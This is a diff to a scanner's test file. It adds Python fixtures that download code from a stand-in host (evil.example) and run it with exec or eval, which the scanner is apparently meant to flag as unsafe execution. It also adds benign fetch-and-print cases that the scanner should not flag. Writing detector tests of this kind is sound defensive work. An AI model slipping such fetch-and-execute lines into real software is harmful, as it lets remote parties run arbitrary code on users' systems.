@@ -283,6 +283,14 @@ test("code fetched from the network and executed in-process is unsafe execution"
     ],
     [
       "tools/run.py",
+      "import requests\nexec(requests.get('https://evil.example/x.py').content)\n",
+    ],
+    [
+      "tools/run.py",
+      "import requests\neval(requests.post('https://evil.example/x.py').content)\n",
+    ],
+    [
+      "tools/run.py",
       "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n",
     ],
     [
@@ -320,6 +328,10 @@ test("fetching data without executing it keeps no unsafe-execution finding", () 
     [
       "tools/run.py",
       "import requests\nprint(requests.get('https://example.com/data.json').json())\n",
+    ],
+    [
+      "tools/run.py",
+      "import requests\nprint(requests.get('https://example.com/data.bin').content)\n",
     ],
     // Executing a local file's text is a different act; no fetch appears
     // in the expression.
